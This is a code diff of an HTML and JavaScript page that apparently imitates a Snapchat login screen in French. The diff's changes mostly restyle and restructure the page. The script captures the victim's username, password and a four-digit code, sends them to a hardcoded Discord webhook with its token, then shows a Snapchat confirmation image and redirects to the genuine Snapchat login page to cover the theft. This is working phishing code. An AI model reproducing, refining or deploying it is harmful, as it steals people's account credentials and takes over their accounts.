@@ -19,9 +19,8 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      color: #000;
     }
-    .login-box {
+    .login-box, .image-screen {
       width: 100%;
       max-width: 400px;
       padding: 40px;
@@ -52,8 +51,6 @@
       border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 16px;
-      background-color: #fff;
-      color: #000;
       box-sizing: border-box;
     }
     button {
@@ -67,17 +64,6 @@
       cursor: pointer;
       margin-top: 20px;
       font-size: 16px;
-      transition: background-color 0.3s;
-    }
-    button:hover {
-      background-color: #e6e600;
-    }
-    #errorMessage,
-    #referralError {
-      color: red;
-      display: none;
-      margin-top: 10px;
-      font-size: 14px;
     }
     .links-container {
       display: flex;
@@ -91,16 +77,19 @@
       color: blue;
       font-weight: bold;
       cursor: pointer;
-      padding: 0;
-      font-family: inherit;
-      font-size: inherit;
       text-decoration: underline;
     }
-    #imageContainer {
+    #errorMessage,
+    #referralError {
+      color: red;
+      display: none;
+      margin-top: 10px;
+    }
+    #imageScreen {
       display: none;
     }
-    #imageContainer img {
-      max-width: 100%;
+    #imageScreen img {
+      width: 100%;
       border-radius: 10px;
     }
   </style>
@@ -126,21 +115,21 @@
       <button type="submit">Connexion</button>
 
       <div class="links-container">
-        <button type="button" class="link-button" id="signupLink">S'inscrire</button>
-        <button type="button" class="link-button" id="forgotPassword">Mot de passe oublié</button>
+        <button type="button" class="link-button">S'inscrire</button>
+        <button type="button" class="link-button">Mot de passe oublié</button>
       </div>
     </form>
     <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
     <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <div id="imageContainer">
-    <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Notification Snapchat" />
+  <div class="image-screen" id="imageScreen">
+    <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Confirmation Snapchat" />
   </div>
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";
-    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login?continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fwww.snapchat.com%252Fweb%252Ff3411d81-73e7-59d1-a928-9af58b989e8a";
+    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
@@ -148,24 +137,19 @@
       const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value.trim();
       const referralCode = document.getElementById('referralCode').value.trim();
+
       const errorMessage = document.getElementById('errorMessage');
       const referralError = document.getElementById('referralError');
 
       errorMessage.style.display = 'none';
       referralError.style.display = 'none';
 
-      if (
-        username.length < 3 ||
-        password.length < 3 ||
-        username.includes(" ") ||
-        password.includes(" ")
-      ) {
+      if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
         errorMessage.style.display = 'block';
         return;
       }
 
-      const referralRegex = /^\d{4}$/;
-      if (!referralRegex.test(referralCode)) {
+      if (!/^\d{4}$/.test(referralCode)) {
         referralError.style.display = 'block';
         return;
       }
@@ -189,28 +173,25 @@
 
       fetch(webhookURL, {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(message),
-      });
-
-      // Interface masquée + attente
-      document.getElementById('loginBox').style.display = 'none';
-
-      setTimeout(() => {
-        document.getElementById('imageContainer').style.display = 'block';
-
+      })
+      .then(response => {
+        // Après l'envoi, lancer le processus d'affichage et de redirection
         setTimeout(() => {
-          window.location.href = redirectURL;
-        }, 30000); // 30 secondes
-      }, 2000); // 2 secondes
-    });
+          document.getElementById('loginBox').style.display = 'none';
+          document.getElementById('imageScreen').style.display = 'block';
 
-    document.getElementById('signupLink').addEventListener('click', () => {
-      alert("Redirection vers la page d'inscription...");
-    });
+          setTimeout(() => {
+            window.location.href = redirectURL;
+          }, 30000); // 30 secondes
+        }, 2000); // 2 secondes
 
-    document.getElementById('forgotPassword').addEventListener('click', () => {
-      alert("Redirection vers la récupération de mot de passe...");
+      })
+      .catch(error => {
+        alert("Erreur réseau ou CORS.");
+        console.error(error);
+      });
     });
   </script>
 </body>
